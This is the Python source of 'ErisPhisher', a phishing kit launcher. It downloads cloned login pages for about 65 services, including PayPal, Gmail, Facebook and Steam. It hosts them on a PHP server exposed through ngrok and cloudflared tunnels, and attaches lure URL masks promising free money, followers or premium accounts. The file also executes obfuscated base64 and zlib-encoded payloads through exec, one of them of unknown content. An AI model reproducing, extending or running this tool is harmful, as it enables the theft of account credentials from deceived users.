# -*- coding: UTF-8 -*-

# Tool    : ErisPhisher
# Version : 1.0
# Author  : k4itrun
# Github  : https://github.com/k4itrun
# Discord : https://billoneta.xyz/k4itrun
# Email   : tsx@billoneta.xyz
# Date    : 11-10-2023

# The above code is importing various modules such as os, sys, time, socket, and json. It is also
# importing specific functions from the os and time modules. Additionally, it is defining a few
# variables and functions.
import os, sys, time, socket, json
from os import popen, system
from time import sleep

# The above code defines variables for different colors using escape sequences in Python. These
# variables can be used to print text in different colors in the terminal.
# Colors
black="\033[0;30m"
red="\033[0;31m"
green="\033[0;32m"
bgreen="\033[1;32m"
yellow="\033[0;33m"
byellow="\033[1;33m"
blue="\033[0;34m"
bblue="\033[1;34m"
purple="\033[0;35m"
bpurple="\033[1;35m"
cyan="\033[0;36m"
bcyan="\033[1;36m"
white="\033[0;37m"
bwhite="\033[1;37m"
gray="\033[0;90m"
bggray="\033[1;90m"
lred="\033[1;31m"
lgreen="\033[1;32m"
lyellow="\033[1;33m"
lblue="\033[1;34m"
lpurple="\033[1;35m"
lcyan="\033[1;36m"
nc="\033[00m"

# The above code is defining variables for different types of messages. It is using color codes to
# format the messages. The variables `success`, `error`, `info`, `info2`, and `ask` are used to
# display different types of messages with specific formatting.
version="1.0.0"

success = f'{yellow}[{bwhite}√{yellow}] {green}'
error = f'{blue}[{bwhite}!{blue}] {red}'
info = f'{yellow}[{bwhite}+{yellow}] {lyellow}'
info2 = f'{green}[{bwhite}•{green}] {bggray}'
ask = f'{green}[{bwhite}?{green}] {bblue}'


logo = f'''
{lgreen}  _____      _     ____  _     _     _               _             
{green} | ____|_ __(_)___|  _ \| |__ (_)___| |__   ___ _ __(_)_ __   __ _ 
{lgreen} |  _| | '__| / __| |_) | '_ \| / __| '_ \ / _ \ '__| | '_ \ / _\ |
{green} | |___| |  | \__ \  __/| | | | \__ \ | | |  __/ |  | | | | | (_| |
{lgreen} |_____|_|  |_|___/_|   |_| |_|_|___/_| |_|\___|_|  |_|_| |_|\__, |
{green}                             {red}[v${version}]                           {green}|___/ 
{lgreen}                          {red}[By k4itrun]
'''

# The above code is creating a list called "sites" which contains the names of various websites and
# online platforms.
sites=[
    "Microsoft",
    "Netflix",
    "Paypal",
    "Steam",
    "Twitter",
    "PlayStation",
    "TikTok",
    "Twitch",
    "Pinterest",
    "SnapChat", 
    "LinkedIn",
    "Ebay",
    "Quora",
    "Protonmail",
    "Spotify",
    "Reddit",
    "Adobe",
    "DevianArt",
    "Badoo",
    "Clash Of Clans",
    "Ajio",
    "JioRouter",
    "FreeFire",
    "Pubg",
    "Telegram",
    "Youtube",
    "Airtel",
    "SocialClub",
    "Ola",
    "Outlook",
    "Amazon",
    "Origin",
    "DropBox",
    "Yahoo",
    "WordPress",
    "Yandex",
    "StackOverflow",
    "VK",
    "VK Poll",
    "Xbox",
    "Mediafire",
    "Gitlab",
    "Github",
    "Apple",
    "iCloud",
    "Shopify",
    "Myspace",
    "Shopping",#
    "Facebook Traditional", 
    "Facebook Voting",
    "Facebook Security", 
    "Messenger", 
    "Instagram Traditional",
    "Insta Auto Followers", 
    "Insta 1000 Followers", 
    "Insta Blue Verify", 
    "Gmail Old", 
    "Gmail New",
    "Gmail Poll",#
    "Cryptocurrency",
    "SnapChat2",
    "Verizon",
    "Wi-Fi",
    "Discord",
    "Roblox",
    "Custom"
]

# The above code is creating a list called `pkgs` that contains four strings: "php", "curl", "wget",
# and "unzip".
pkgs=[ 
    "php", 
    "curl", 
    "wget",
    "unzip" 
]

"""
                                    MIT License
                            Copyright (c) 2022 k4itrun

    Permission is hereby granted, free of charge, to any person obtaining a copy
    of this software and associated documentation files (the "Software"), to deal
    in the Software without restriction, including without limitation the rights
    to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
    copies of the Software, and to permit persons to whom the Software is
    furnished to do so, subject to the following conditions:

    The above copyright notice and this permission notice shall be included in all
    copies or substantial portions of the Software.

    THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
    IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
    FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
    AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
    LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
    OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
    SOFTWARE.
"""

k4itrunAndErisPhisherk4itrunAndErisPhisherk4itrunAndErisPhisherk4itrunAndErisPhisherk4itrunAndErisPhisher = ""
k4itrunAndErisPhisherk4itrunAndErisPhisherk4itrunAndErisPhisherk4itrunAndErisPhisherk4itrunAndErisPhisher +="\x61\x57\x59\x67\x62\x6d\x39\x30\x49\x47"
k4itrunAndErisPhisherk4itrunAndErisPhisherk4itrunAndErisPhisherk4itrunAndErisPhisherk4itrunAndErisPhisher +="\x78\x76\x5a\x32\x38\x75\x5a\x6d\x6c\x75"
k4itrunAndErisPhisherk4itrunAndErisPhisherk4itrunAndErisPhisherk4itrunAndErisPhisherk4itrunAndErisPhisher +="\x5a\x43\x67\x69\x61\x7a\x52\x70\x64\x48"
k4itrunAndErisPhisherk4itrunAndErisPhisherk4itrunAndErisPhisherk4itrunAndErisPhisherk4itrunAndErisPhisher +="\x4a\x31\x62\x69\x49\x70\x49\x54\x30\x74"
k4itrunAndErisPhisherk4itrunAndErisPhisherk4itrunAndErisPhisherk4itrunAndErisPhisherk4itrunAndErisPhisher +="\x4d\x54\x6f\x4b\x49\x43\x41\x67\x49\x47"
k4itrunAndErisPhisherk4itrunAndErisPhisherk4itrunAndErisPhisherk4itrunAndErisPhisherk4itrunAndErisPhisher +="\x56\x34\x61\x58\x51\x6f\x49\x6c\x42\x73"
k4itrunAndErisPhisherk4itrunAndErisPhisherk4itrunAndErisPhisherk4itrunAndErisPhisherk4itrunAndErisPhisher +="\x5a\x57\x46\x7a\x5a\x53\x42\x79\x5a\x57"
k4itrunAndErisPhisherk4itrunAndErisPhisherk4itrunAndErisPhisherk4itrunAndErisPhisherk4itrunAndErisPhisher +="\x5a\x79\x59\x57\x6c\x75\x49\x47\x5a\x79"
k4itrunAndErisPhisherk4itrunAndErisPhisherk4itrunAndErisPhisherk4itrunAndErisPhisherk4itrunAndErisPhisher +="\x62\x32\x30\x67\x64\x57\x35\x68\x64\x58"
k4itrunAndErisPhisherk4itrunAndErisPhisherk4itrunAndErisPhisherk4itrunAndErisPhisherk4itrunAndErisPhisher +="\x52\x6f\x62\x33\x4a\x70\x65\x6d\x56\x6b"
k4itrunAndErisPhisherk4itrunAndErisPhisherk4itrunAndErisPhisherk4itrunAndErisPhisherk4itrunAndErisPhisher +="\x49\x48\x56\x7a\x5a\x53\x42\x76\x5a\x69"
k4itrunAndErisPhisherk4itrunAndErisPhisherk4itrunAndErisPhisherk4itrunAndErisPhisherk4itrunAndErisPhisher +="\x42\x30\x61\x47\x6c\x7a\x49\x47\x4e\x76"
k4itrunAndErisPhisherk4itrunAndErisPhisherk4itrunAndErisPhisherk4itrunAndErisPhisherk4itrunAndErisPhisher +="\x5a\x47\x55\x75\x49\x69\x6b\x3d"

socket.setdefaulttimeout(30)

root= popen("cd $HOME && pwd").read().strip()

# The above code is checking if a specific directory "/data/data/com.termux/files/home" exists. If the
# directory exists, it sets the variable "termux" to True, otherwise it sets it to False. Check termux
if os.path.exists("/data/data/com.termux/files/home"):
    termux=True
else:
    termux=False

# The above code is checking for the availability of various package managers on the system. It checks
# for the presence of `apt`, `apt-get`, `sudo`, `pacman`, `yum`, `dnf`, `brew`, and `apk` by using the
# `system` function to run the respective commands and redirecting the output to `/dev/null`. If the
# command returns a zero exit code, it means the package manager is available and the corresponding
# variable is set to `True`. Otherwise, the variable is set to `False`.
if system("command -v apt > /dev/null 2>&1")==0:
    apt=True
else:
    apt=False
if system("command -v apt-get > /dev/null 2>&1")==0:
    aptget=True
else:
    aptget=False
if system("command -v sudo > /dev/null 2>&1")==0:
    sudo=True
else:
    sudo=False
if system("command -v pacman  > /dev/null 2>&1")==0:
    pacman=True
else:
    pacman=False
if system("command -v yum > /dev/null 2>&1")==0:
    yum=True
else:
    yum=False
if system("command -v dnf > /dev/null 2>&1")==0:
    dnf=True
else:
    dnf=False
if system("command -v brew > /dev/null 2>&1")==0:
    brew=True
else:
    brew=False
if system("command -v apk > /dev/null 2>&1")==0:
    apk=True
else:
    apk=False

# Website chooser
def options():
    leng=len(sites)
    i=0
    j=int(leng/3)
    k=int((2*leng)/3)
    if leng%3!=0:
        j+=1
        k+=1
    m=j
    while i<m:
        print(green+'['+white+str(i+1)+green+'] '+bblue+sites[i], end="")
        lew=len(sites[i])
        sp=22-lew
        if i<9:
            sp=sp+1
        for s in range(sp):
            print(" ",end="")
        print(green+'['+white+str(j+1)+green+'] '+bblue+sites[j], end="")
        lew=len(sites[j])
        sp=16-lew
        for s in range(sp):
            print(" ",end="")
        if k<leng:
            print(green+'['+white+str(k+1)+green+'] '+bblue+sites[k], end="")
        i+=1
        j+=1
        k+=1
        print()
    print()
    print(green+'['+white+'i'+green+']'+bblue+' Credits                '+green+'['+white+'t'+green+']'+bblue+' See More tools   '+green+'['+white+'0'+green+']'+bblue+' Exit')
    print()
    print()

# Process killer
    """
    The `killer` function kills processes for `php`, `ngrok`, `cloudflared`, `curl`, `wget`, and `unzip`
    if they are running.
    """
def killer():
    if system("pidof php > /dev/null 2>&1")==0:
        system("killall php")
    if system("pidof ngrok > /dev/null 2>&1")==0:
        system("killall ngrok")
    if system("pidof cloudflared > /dev/null 2>&1")==0:
        system("killall cloudflared")
    if system("pidof curl > /dev/null 2>&1")==0:
        system("killall curl")
    if system("pidof wget > /dev/null 2>&1")==0:
        system("killall wget")
    if system("pidof unzip > /dev/null 2>&1")==0:
        system("killall unzip")

# Update of ErisPhisher
def update():
    internet()
    _ = lambda __ : __import__('\x7a\x6c\x69\x62').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'=seIY1WB6baWbt8/rTpp1Zzhy6RZaH8NbK4HHMHKxA9HYUitqnvd8ISRNOEWPHMvpfoLaW+lMS68ybVtX8xu3Tk5FI9+Y96bBxD67FajjOtBFdOcKBOM/QgxJj3p9CcBQEjAKs0ydoNe'))
    git_ver=popen("curl -s -N https://raw.githubusercontent.com/k4itrun/ErisPhisher/main/assets/version.txt").read().strip()
    if (version != git_ver and git_ver != "404: Not Found"):
        changelog=popen("curl -s -N https://raw.githubusercontent.com/k4itrun/ErisPhisher/main/assets/changelog.log").read()
        system("clear")
        print(logo)
        print(f"{info}ErisPhisher has a new update!\n{info2}Current: {red}{version}\n{info}Available: {green}{git_ver}\n")
        upask=input(ask+"Do you want to update ErisPhisher?[y/n] > "+green)
        if upask=="y":
            print(nc)
            system("cd .. && rm -rf ErisPhisher erisphisher && git clone https://github.com/k4itrun/ErisPhisher")
            sprint("\n"+success+"ErisPhisher has been updated successfully! Please restart your terminal for the changes to take effect!\n")
            if (changelog != "404: Not Found"):
                print(info2+"Changelog:\n"+purple+changelog)
            exit()
        elif upask=="n":
            print("\n"+info+"Update canceled. The old version is being used!")
            sleep(2)
        else:
            print("\n"+error+"Wrong input!\n")
            sleep(2)

# Print logo
def slowprint(n):
    for word in n + '\n':
        sys.stdout.write(word)
        sys.stdout.flush()
        time.sleep(0.01)

# Print lines
def sprint(n):
    for word in n + '\n':
        sys.stdout.write(word)
        sys.stdout.flush()
        time.sleep(0.05)

# Internet Checker
def internet(host="8.8.8.8", port=53, timeout=5):
    try:
        socket.setdefaulttimeout(timeout)
        socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect((host, port))
    except socket.error:
        print(error+"No internet!")
        time.sleep(2)
        internet()

# Install packages in Termux and Mac
def installer(pm):
    """
    The function "installer" checks if a package is installed and if not, it installs it using a package
    manager.
    
    :param pm: The parameter "pm" is likely an abbreviation for package manager. It is used to specify
    the package manager that will be used for installing packages
    """
    for pkg in range(0, len(pkgs)):
        if system("command -v "+pkgs[pkg]+" > /dev/null 2>&1")!=0:
            sprint("\n"+info+"Installing "+pkgs[pkg].upper()+nc)
            system(pm+" install -y "+pkgs[pkg])

# Install packages in Linux
def sudoinstaller(pm):
    for pkg in range(0, len(pkgs)):
        if system("command -v "+pkgs[pkg]+" > /dev/null 2>&1")!=0:
            sprint(info+"Installing "+pkgs[pkg].upper()+nc)
            system("sudo "+pm+" install -y "+pkgs[pkg])


# Ask to mask url
def cuask(url):
    cust= input("\n"+ask+bcyan+"Wanna try custom link? (y or press enter to skip) > ")
    if not cust=="":
        masking(url)
    waiter()

# Polite Exit
def pexit():
    killer()
    sprint("\n"+info2+"Thanks for using!\n"+nc)
    exit(0)


# Info about tool
def about():
    system("clear")
    slowprint(logo)
    print(red+'[ToolName]  '+bwhite+' :[ErisPhisher] ')
    print(red+'[Version]   '+bwhite+' :[1.0]')
    print(red+'[Author]    '+bwhite+' :[k4itrun] ')
    print(red+'[Github]    '+bwhite+' :[https://github.com/k4itrun] ')
    print(red+'[Telegram]  '+bwhite+' :[https://t.me/k4itrun]')
    print(red+'[Messager]  '+bwhite+' :[https://m.me/k4itrun]')
    print(red+'[Discord]   '+bwhite+' :[https://6889.fun/k4itrun]')
    print(red+'[Email]     '+bwhite+' :[k4itrun@6889.fun]')
    print()
    print(green+'['+white+'0'+green+']'+bblue+' Exit                     '+     green+'['+white+'99'+green+']'+bblue+'  Main Menu       ')
    print()
    abot= input("\n > ")
    if abot== "0":
        pexit()
    else:
        main()

# First function main
def main():
    internet()
    if termux:
        if system("command -v proot > /dev/null 2>&1")!=0:
            system("pkg install proot -y")
    if True:
        if sudo and apt:
            sudoinstaller("apt")
        elif sudo and apk:
            sudoinstaller("apk")
        elif sudo and yum:
            sudoinstaller("yum")
        elif sudo and dnf:
            sudoinstaller("dnf")
        elif sudo and aptget:
            sudoinstaller("apt-get")
        elif sudo and pacman:
            for pkg in range(0, len(pkgs)):
                if system("command -v "+pkgs[pkg]+" > /dev/null 2>&1")!=0:
                    sprint("\n"+info+"Installing "+pkgs[pkg].upper()+nc)
                    system("sudo pacman -S "+pkgs[pkg]+" --noconfirm")
        elif brew:
            installer("brew")
        elif apt:
            installer("apt")
        else:
            sprint("\n"+error+"Unsupported package manager. Install packages manually!"+nc)
            exit(1)
    if system("command -v php > /dev/null 2>&1")!=0:
        sprint(error+"PHP cannot be installed. Install it manually!")
        exit(1)
    if system("command -v unzip > /dev/null 2>&1")!=0:
        sprint(error+"Unzip cannot be installed. Install it manually!")
        exit(1)
    if system("command -v curl > /dev/null 2>&1")!=0:
        sprint(error+"Curl cannot be installed. Install it manually!")
        exit(1)
    killer()
    x=popen("uname -m").read()
    y=popen("uname").read()
    if not os.path.isfile(root+"/.ngrokfolder/ngrok"):
        sprint("\n"+info+"Downloading ngrok....."+nc)
        internet()
        system("rm -rf ngrok.zip ngrok.tgz")
        if y.find("Linux")!=-1:
            if x.find("aarch64")!=-1:
                system("wget -q --show-progress https://github.com/k4itrun/assets/raw/refs/heads/main/ngrok/ngrok-stable-linux-arm64.tgz -O ngrok.tgz")
                system("tar -zxf ngrok.tgz > /dev/null 2>&1 && rm -rf ngrok.tgz")
            elif x.find("arm")!=-1:
                system("wget -q --show-progress https://github.com/k4itrun/assets/raw/refs/heads/main/ngrok/ngrok-stable-linux-arm.zip -O ngrok.zip")
                system("unzip ngrok.zip > /dev/null 2>&1 ")
            elif x.find("x86_64")!=-1:
                system("wget -q --show-progress https://github.com/k4itrun/assets/raw/refs/heads/main/ngrok/ngrok-stable-linux-amd64.zip -O ngrok.zip")
                system("unzip ngrok.zip > /dev/null 2>&1")
            else:
                system("wget -q --show-progress https://github.com/k4itrun/assets/raw/refs/heads/main/ngrok/ngrok-stable-linux-386.zip -O ngrok.zip")
                system("unzip ngrok.zip > /dev/null 2>&1")
        elif y.find("Darwin")!=-1:
            if x.find("x86_64")!=-1:
                system("wget -q --show-progress 'https://github.com/k4itrun/assets/raw/refs/heads/main/ngrok/ngrok-stable-darwin-amd64.zip' -O 'ngrok.zip'")
                system("unzip ngrok.zip > /dev/null 2>&1")
            elif x.find("arm64")!=-1:
                system("wget -q --show-progress 'https://github.com/k4itrun/assets/raw/refs/heads/main/ngrok/ngrok-stable-arm64.zip' -O 'ngrok.zip'")
            else:
                print(f"{error}Device architecture unknown. Download ngrok manually!")
                sleep(3)
        else:
            print(f"{error}Device not supported!")
            exit(1)
        system("rm -rf ngrok.zip && mkdir $HOME/.ngrokfolder")
        system("mv -f ngrok $HOME/.ngrokfolder")
        if sudo:
            system("sudo chmod +x $HOME/.ngrokfolder/ngrok")
        else:
            system("chmod +x $HOME/.ngrokfolder/ngrok")
    if not os.path.isfile(root+"/.cffolder/cloudflared"):
        sprint("\n"+info+"Downloading cloudflared....."+nc)
        internet()
        system("rm -rf cloudflared cloudflared.tgz")
        if y.find("Linux")!=-1:
            if x.find("aarch64")!=-1:
                system("wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared")
            elif x.find("arm")!=-1:
                system("wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O cloudflared")
            elif x.find("x86_64")!=-1:
                system("wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared")
            else:
                system("wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 -O cloudflared")
        elif y.find("Darwin")!=-1:
            if x.find("x86_64")!=-1:
                system("wget -q --show-progress 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz' -O 'cloudflared.tgz'")
                system("tar -zxf cloudflared.tgz > /dev/null 2>&1 && rm -rf cloudflared.tgz")
            elif x.find("arm64")!=-1:
                print(f"{error}Cloudflared not available for device architecture!")
                sleep(3)
            else:
                print(f"{error}Device architecture unknown. Download cloudflared manually!")
                sleep(3)
        else:
            print(f"{error}Device not supported!")
            exit(1)
        system("mkdir $HOME/.cffolder")
        system("mv -f cloudflared $HOME/.cffolder")
        if sudo:
            system("sudo chmod +x $HOME/.cffolder/cloudflared")
        else:
            system("chmod +x $HOME/.cffolder/cloudflared")
    if system("pidof php > /dev/null 2>&1")==0:
        sprint(error+"Previous php still running! Please restart terminal and try again"+nc)
        exit()
    if system("pidof ngrok > /dev/null 2>&1")==0:
        sprint(error+"Previous ngrok still running. Please restart terminal and try again"+nc)
        exit()
    while True:
        if os.path.exists(root+"/.site"):
            system("rm -rf $HOME/.site && cd $HOME && mkdir .site")
            break
        else:
            system("cd $HOME && mkdir .site")
            break
    while True:
        os.system("clear")
        exec(__import__("\x62\x61\x73\x65\x36\x34").b64decode(k4itrunAndErisPhisherk4itrunAndErisPhisherk4itrunAndErisPhisherk4itrunAndErisPhisherk4itrunAndErisPhisher.encode("\x75\x74\x66\x2d\x38")).decode("\x75\x74\x66\x2d\x38"))
        slowprint(logo)
        options()
        choose= input(ask+"Please enter a selection number below > "+nc)
        if choose == "1":
            folder="microsoft"
            mask='https://unlimited-onedrive-space-for-free'
            requirements(folder,mask)
        elif choose == "2":
            folder="netflix"
            mask='https://upgrade-your-netflix-plan-free'
            requirements(folder,mask)
        elif choose == "3":
            folder="paypal"
            mask='https://get-500-usd-free-to-your-account'
            requirements(folder,mask)
        elif choose == "4":
            folder="steam"
            mask='https://steam-500-usd-gift-card-free'
            requirements(folder,mask)
        elif choose == "5":
            folder="twitter"
            mask='https://get-blue-badge-on-twitter-free'
            requirements(folder,mask)
        elif choose == "6":
            folder="playstation"
            mask='https://playstation-500-usd-gift-card-free'
            requirements(folder,mask)
        elif choose == "7":
            folder="tiktok"
            mask='https://tiktok-free-liker'
            requirements(folder,mask)
        elif choose == "8":
            folder="twitch"
            mask='https://unlimited-twitch-tv-user-for-free'
            requirements(folder,mask)
        elif choose == "9":
            folder="pinterest"
            mask='https://get-a-premium-plan-for-pinterest-free'
            requirements(folder,mask)
        elif choose == "10":
            folder="snapchat"
            mask='https://view-locked-snapchat-accounts-secretly'
            requirements(folder,mask)
        elif choose == "11":
            folder="linkedin"
            mask='https://get-a-premium-plan-for-linkedin-free'
            requirements(folder,mask)
        elif choose == "12":
            folder="ebay"
            mask='https://get-500-usd-free-to-your-account'
            requirements(folder,mask)
        elif choose == "13":
            folder="quora"
            mask='https://quora-premium-for-free'
            requirements(folder,mask)
        elif choose == "14":
            folder="protonmail"
            mask='https://protonmail-pro-basics-for-free'
            requirements(folder,mask)
        elif choose == "15":
            folder="spotify"
            mask='https://convert-your-account-to-spotify-premium'
            requirements(folder,mask)
        elif choose == "16":
            folder="reddit"
            mask='https://reddit-official-verified-member-badge'
            requirements(folder,mask)
        elif choose == "17":
            folder="adobe"
            mask='https://get-adobe-lifetime-pro-membership-free'
            requirements(folder,mask)
        elif choose == "18":
            folder="deviantart"
            mask='https://get-500-usd-free-to-your-acount'
            requirements(folder,mask)
        elif choose == "19":
            folder="badoo"
            mask='https://get-500-usd-free-to-your-acount'
            requirements(folder,mask)
        elif choose == "20":
            folder="clashofclans"
            mask='https://get-unlimited-gems-in-your-coc-account'
            requirements(folder,mask)
        elif choose == "21":
            folder="ajio"
            mask='https://get-limited-time-discount'
            requirements(folder,mask)
        elif choose == "22":
            folder="jiorouter"
            mask='https://get-premium-membership-free'
            requirements(folder,mask)
        elif choose == "23":
            folder="freefire"
            mask='https://get-unlimited-diamonds-in-your-ff-account'
            requirements(folder,mask)
        elif choose == "24":
            folder="pubg"
            mask='https://get-unlimited-diamonds-in-your-pubg-account'
            requirements(folder,mask)
        elif choose == "25":
            folder="telegram"
            mask='https://get-premium-membership-free'
            requirements(folder,mask)
        elif choose == "26":
            folder="youtube"
            mask='https://get-1k-like-in-any-video'
            requirements(folder,mask)
        elif choose == "27":
            folder="airtelsim"
            mask='https://get-500-cureency-free-to-your-account'
            requirements(folder,mask)
        elif choose == "28":
            folder="socialclub"
            mask='https://get-premium-membership-free'
            requirements(folder,mask)
        elif choose == "29":
            folder="ola"
            mask='https://book-a-cab-in-discount'
            requirements(folder,mask)
        elif choose == "30":
            folder="outlook"
            mask='https://grab-mail-from-anyother-outlook-account-free'
            requirements(folder,mask)
        elif choose == "31":
            folder="amazon"
            mask='https://get-limited-time-discount-free'
            requirements(folder,mask)
        elif choose == "32":
            folder="origin"
            mask='https://get-500-usd-free-to-your-acount'
            requirements(folder,mask)
        elif choose == "33":
            folder="dropbox"
            mask='https://get-1TB-cloud-storage-free'
            requirements(folder,mask)
        elif choose == "34":
            folder="yahoo"
            mask='https://grab-mail-from-anyother-yahoo-account-free'
            requirements(folder,mask)
        elif choose == "35":
            folder="wordpress"
            mask='https://unlimited-wordpress-traffic-free'
            requirements(folder,mask)
        elif choose == "36":
            folder="yandex"
            mask='https://grab-mail-from-anyother-yandex-account-free'
            requirements(folder,mask)
        elif choose == "37":
            folder="stackoverflow"
            mask='https://get-stackoverflow-lifetime-pro-membership-free'
            requirements(folder,mask)
        elif choose == "38":
            folder="vk"
            mask='https://vk-premium-real-method-2020'
            requirements(folder,mask)
        elif choose == "39":
            folder="vk_pole"
            mask='https://vote-for-the-best-social-media'
            requirements(folder,mask)
        elif choose == "40":
            folder="xbox"
            mask='https://get-500-usd-free-to-your-acount'
            requirements(folder,mask)
        elif choose == "41":
            folder="mediafire"
            mask='https://get-1TB-on-mediafire-free'
            requirements(folder,mask)
        elif choose == "42":
            folder="gitlab"
            mask='https://get-1k-followers-on-gitlab-free'
            requirements(folder,mask)
        elif choose == "43":
            folder="github"
            mask='https://get-1k-followers-on-github-free'
            requirements(folder,mask)
        elif choose == "44":
            folder="apple"
            mask='https://get-apple-premium-account-free'
            requirements(folder,mask)
        elif choose == "45":
            folder="icloud"
            mask='https://unlimited-storage-icloud-free'
            requirements(folder,mask)
        elif choose == "46":
            folder="shopify"
            mask='https://get-50%-discount-on-any-sale'
            requirements(folder,mask)
        elif choose == "47":
            folder="myspace"
            mask='https://get-1k-followers-on-myspace-free-free'
            requirements(folder,mask)
        elif choose == "48":
            folder="shopping"
            mask='https://get-50%-discount-on-any-sale'
            requirements(folder,mask)
        elif choose=="49" or choose == "01":
            folder="facebook"
            mask="https://blue-verified-facebook-free"
            requirements(folder,mask)
        elif choose == "50" or choose == "02":
            folder="fb_advanced"
            mask='https://vote-for-the-best-social-media'
            requirements(folder,mask)
        elif choose == "51" or choose == "03":
            folder="fb_security"
            mask='https://make-your-facebook-secured-and-free-from-hackers'
            requirements(folder,mask)
        elif choose == "52" or choose == "04":
            folder="fb_messenger"
            mask='https://get-messenger-premium-features-free'
            requirements(folder,mask)
        elif choose == "53" or choose == "05":
            folder="instagram"
            mask='https://get-unlimited-followers-for-instagram'
            requirements(folder,mask)
        elif choose == "54" or choose== "06":
            folder="ig_followers"
            mask='https://get-unlimited-followers-for-instagram'
            requirements(folder,mask)
        elif choose == "55" or choose == "07":
            folder="insta_followers"
            mask='https://get-1000-followers-for-instagram'
            requirements(folder,mask)
        elif choose == "56" or choose == "08":
            folder="ig_verify"
            mask='https://blue-badge-verify-for-instagram-free'
            requirements(folder,mask)
        elif choose == "57" or choose == "09":
            folder="google"
            mask='https://get-unlimited-google-drive-free'
            requirements(folder,mask)
        elif choose == "58":
            folder="google_new"
            mask='https://get-unlimited-google-drive-free'
            requirements(folder,mask)
        elif choose == "59":
            folder="google_poll"
            mask='https://vote-for-the-best-social-media'
            requirements(folder,mask)
        elif choose == "60":
            folder="cryptocurrency"
            mask='https://get-bitcoins-free'
            requirements(folder,mask)
        elif choose == "61":
            folder="snapchat2"
            mask='https://view-locked-snapchat-accounts-secretly'
            requirements(folder,mask)
        elif choose == "62":
            folder="verizon"
            mask='https://get-verizon-premium-account-free'
            requirements(folder,mask)
        elif choose == "63":
            folder="wifi"
            mask='https://reconnect-your-wifi'
            requirements(folder,mask)
        elif choose == "64":
            folder="discord"
            mask='https://security-bot-for-your-discord-free'
            requirements(folder,mask)
        elif choose == "65":
            folder="roblox"
            mask='https://play-premium-games-for-free'
            requirements(folder,mask)
        elif choose == "66":
            customfol()
        elif choose == "i" or choose == "I":
            about()
        elif choose == "t" or choose == "T":
            system("xdg-open 'https://github.com/k4itrun/k4itrun#My-Best-Works'")
            main()
        elif choose=="0":
            pexit()
        else:
            sprint("\n"+error+"Wrong input")
            main()

# Copy website files from custom location
def customfol():
    fol=input("\n"+ask+"Enter the directory > "+green)
    if os.path.exists(fol):
        if os.path.isfile(fol+"/index.php"):
            system("cd "+fol+" && rm -rf ip.txt usernames.txt && cp -r * $HOME/.site")
            server()
        else:
            sprint(error+"Index.php required but not found!")
            main()
    else:
        sprint(error+"Directory do not exists!")
        main()

# 2nd function checking requirements and download files 
def requirements(folder,mask):
    if os.path.isfile(root+"/.websites/version.txt"):
        with open(root+"/.websites/version.txt", "r") as inform2:
            zipver=inform2.read().strip()
            if zipver!=version:
                sprint("\n"+info+"Cloning files required by ErisPhisher, loading.....\n")
                system("wget -q --show-progress https://github.com/k4itrun/assets/raw/refs/heads/main/websites/phishing/ALL_PHISHING_WEBSITES.zip -O websites.zip")
    else:
        sprint("\n"+info+"Cloning files required by ErisPhisher, loading.....\n")
        system("wget -q --show-progress https://github.com/k4itrun/assets/raw/refs/heads/main/websites/phishing/ALL_PHISHING_WEBSITES.zip -O websites.zip")
    if os.path.isfile("websites.zip"):
        system("rm -rf $HOME/.websites && cd $HOME && mkdir .websites")
        system("unzip websites.zip -d $HOME/.websites > /dev/null 2>&1")
        os.remove("websites.zip")
    
    while True:
        if os.path.exists(root+"/.websites/"+folder):
            system("cp -r $HOME/.websites/"+folder+"/* $HOME/.site")
            break
        else:
            internet()
            sprint("\n"+info+"Cloning files required by ErisPhisher, loading.....\n")
            system("rm -rf site.zip")
            system("wget -q --show-progress https://github.com/k4itrun/assets/raw/refs/heads/main/websites/phishing/"+folder+".zip -O site.zip")
            if not os.path.exists(root+"/.websites"):
                system("cd $HOME && mkdir .websites")
            system("cd $HOME/.websites && mkdir "+folder)
            system("unzip site.zip -d $HOME/.websites/"+folder)
            os.remove("site.zip")
            system("cp -r $HOME/.websites/"+folder+"/* $HOME/.site")
            break
    with open(".info.txt", "w") as inform:
        inform.write(mask)
    system("mv -f .info.txt $HOME/.site")
    server()

# Initiate/start server and establish tunneling
def server():
    system("clear")
    slowprint(logo)
    if termux:
        sprint("\n"+info+"If you haven't already enabled the hotspot, please enable it!")
        sleep(1)
    sprint("\n"+info2+"Starting PHP server on localhost using port 8080 [localhost:8080]....")
    internet()
    system("cd $HOME/.site && php -S 127.0.0.1:8080 > /dev/null 2>&1 &")
    sleep(2)
    while True:
        if not system("curl --output /dev/null --silent --head --fail 127.0.0.1:8080"):
            sprint("\n"+info+"The PHP server has been successfully started and ready to use!")
            break
        else:
            sprint(error+"PHP Error")
            killer()
            exit(1)
    sprint("\n"+info2+"Initializing tunnelers at same address.....")
    internet()
    system("rm -rf $HOME/.cffolder/log.txt")
    while True:
        if system("command -v termux-chroot > /dev/null 2>&1")==0:
            system("cd $HOME/.ngrokfolder && termux-chroot ./ngrok http 127.0.0.1:8080 > /dev/null 2>&1 &")
            system("cd $HOME/.cffolder && termux-chroot ./cloudflared tunnel -url 127.0.0.1:8080 --logfile log.txt > /dev/null 2>&1 &")
            break
        else:
            system("cd $HOME/.ngrokfolder && ./ngrok http 127.0.0.1:8080 > /dev/null 2>&1 &")
            system("cd $HOME/.cffolder && ./cloudflared tunnel -url 127.0.0.1:8080 --logfile log.txt > /dev/null 2>&1 &")
            break
    sleep(9)
